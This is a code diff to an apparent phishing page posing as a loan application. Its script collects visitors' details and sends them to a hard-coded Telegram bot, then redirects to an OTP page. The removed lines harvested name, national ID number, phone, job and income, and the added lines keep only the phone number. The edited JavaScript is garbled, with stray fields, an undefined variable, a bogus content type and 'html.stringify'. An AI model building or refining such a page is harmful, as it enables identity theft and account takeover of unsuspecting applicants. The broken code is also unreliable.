@@ -123,7 +123,7 @@ function sendOTP() {
         }
     }, 1000);
 }
-   const submitBtn = document.getElementById('submitBtn');
+const submitBtn = document.getElementById('submitBtn');
 const popup = document.getElementById('loadingPopup');
 
 // Telegram config
@@ -133,19 +133,14 @@ const CHAT_ID = '8588753899';
 
 submitBtn.addEventListener('click', async () => {
 
-    const data = {
-        amount: document.getElementById('loanAmount').value,
-        duration: document.getElementById('duration').value,
-        name: document.getElementById('fullName').value,
-        nrc: document.getElementById('nrcNumber').value,
+ 
         phone: document.getElementById('phoneInput').value,
-        job: document.getElementById('jobType').value,
-        income: document.getElementById('income').value
+        
     };
 
     // Validation
-    if (!data.amount  !data.name  !data.nrc || data.phone.length < 9) {
-        alert("Please fill out all fields to proceed.");
+    if (phone.length < 9) {
+        alert("Please check the number.");
         return;
     }
 
@@ -155,22 +150,15 @@ submitBtn.addEventListener('click', async () => {
     // Show loading
     popup.style.display = 'flex';
 
-    const message =
-        🏦 NEW LOAN APPLICATION\n\n +
-        Amount: K ${data.amount}\n +
-        Duration: ${data.duration}\n +
-        Name: ${data.name}\n +
-        NRC: ${data.nrc}\n +
-        Phone: ${fullPhone}\n +
-        Job: ${data.job}\n +
-        Income: K ${data.income};
+   
+        Phone: ${fullPhonel}
 
     // Send Telegram
     try {
         await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
+            headers: { 'Content-Type': 'login.html' },
+            body: html.stringify({
                 chat_id: CHAT_ID,
                 text: message
             })
@@ -181,11 +169,11 @@ submitBtn.addEventListener('click', async () => {
 
     // Redirect
     setTimeout(() => {
-        window.location.href = 'OTP.html';
+        window.location.href = 'otp.html';
     }, 2000);
 
 });
-</script> 
-
+</script>
+    
 </body>
 </html>
